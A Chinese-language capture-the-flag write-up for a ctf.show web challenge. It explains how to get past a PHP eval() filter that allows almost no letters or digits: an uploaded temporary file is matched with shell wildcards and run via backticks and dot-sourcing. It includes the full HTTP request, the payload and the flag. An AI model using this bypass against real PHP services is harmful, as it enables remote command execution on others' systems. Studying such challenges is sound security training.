@@ -1,0 +1,103 @@
+1. 题目信息
+题目名称：ctf.show_红包题第二弹
+
+题目类型：Web / 无字母数字 RCE（远程命令执行）绕过
+
+考察知识点：PHP 正则绕过、Linux 通配符匹配、PHP 临时文件上传机制、反引号命令执行
+
+2. 源码审计与受限分析
+题目页面显示注释 <!-- hint:?cmd= -->，并通过 highlight_file(__FILE__) 直接暴露了后端源码，核心逻辑如下：
+
+php
+if(isset($_GET['cmd'])){
+    $cmd=$_GET['cmd'];
+    highlight_file(__FILE__);
+    if(preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
+        die("cerror");
+    }
+    if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
+        die("serror");
+    }
+    eval($cmd);
+}
+2.1 正则限制分析
+通过代码审计，发现 cmd 参数受到两层严格的正则过滤：
+
+第一层（cerror）： /[A-Za-oq-z0-9$]+/
+
+禁止所有大写字母 A-Z
+
+禁止 a 到 o，以及 q 到 z 的小写字母
+
+唯一允许的字母是 p
+
+禁止数字 0-9 和美元符号 $
+
+第二层（serror）： /\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/
+
+禁止了大部分特殊符号，如 ~!@#%^&*()-_{}[]'":, 等。
+
+最终可用字符池： p、.、=、<、>、?、反引号 `。
+
+3. 漏洞原理与利用思路
+3.1 PHP 文件上传临时文件机制
+在 PHP 中，当通过 multipart/form-data 方式上传文件时，服务器会在 /tmp 目录下生成一个临时文件，文件名格式通常为 php?????.tmp（其中 ? 代表随机字符）。该文件在请求结束后会被自动删除，但在 PHP 脚本运行期间，它是真实存在的。
+
+3.2 构造通配符匹配临时文件
+利用 Linux 的通配符 ?（代表任意单个字符），可以构造路径来精准匹配 /tmp 目录下的临时文件：
+
+??p：匹配 3 个字符的目录名（/tmp）。
+
+p?p??????：匹配 8 个字符的文件名（phpXXXX.tmp）。
+
+完整路径： ??p/p?p?????? → 匹配为 /tmp/phpXXXX.tmp。
+
+3.3 反引号命令执行与点号执行
+反引号 `： 在 PHP 中，反引号内的内容会被当作系统命令执行。
+
+.（点号）： 在 Linux Shell 中，点号等同于 source 命令，可以执行指定的 Shell 脚本文件。
+
+4. 攻击步骤与最终 Payload
+4.1 构造 Shell 脚本文件
+在 HTTP 请求的上传数据中，包含一个内容为 Shell 命令的文本文件：
+
+bash
+#! /bin/bash
+cat /flag.txt
+4.2 构造 URL Payload
+php
+?cmd=?><?=`.+/??p/p?p??????`;
+?>：闭合当前 PHP 代码块。
+
+<?=：相当于 <?php echo，用于开启新的 PHP 输出。
+
+`.+/??p/p?p??????`：系统命令，.执行 /tmp/phpXXXX.tmp 脚本文件。
+
+4.3 最终请求包（Burp Suite）
+使用 Burp Suite 构造并发送以下 POST 请求包：
+
+http
+POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1
+Host: <靶机域名>.challenge.ctf.show
+User-Agent: Mozilla/5.0
+Content-Type: multipart/form-data; boundary=---------------------------1234567890
+Content-Length: 237
+
+-----------------------------1234567890
+Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
+Content-Type: text/plain
+
+#! /bin/bash
+cat /flag.txt
+-----------------------------1234567890--
+5. 最终 Flag
+text
+ctfshow{19948592-a9bd-4b44-9bd8-d4d2f5b5bc58}
+6. 总结与知识点
+无字母数字 RCE 绕过： 正则过滤无法覆盖所有场景。通过分析可用的字符池（如 p、通配符、反引号），可以构造巧妙的绕行 Payload。
+
+临时文件利用： 利用 PHP 文件上传产生的临时文件，结合 Linux 通配符匹配，是绕过 WAF 的关键突破点。
+
+反引号与点号的组合： PHP 反引号 加上 Shell 点号 可以完美替代被禁用的 system() 等函数。
+
+多层级利用： 单层防御容易被突破，在安全开发中应将“输入净化”与“最小权限原则”结合使用。
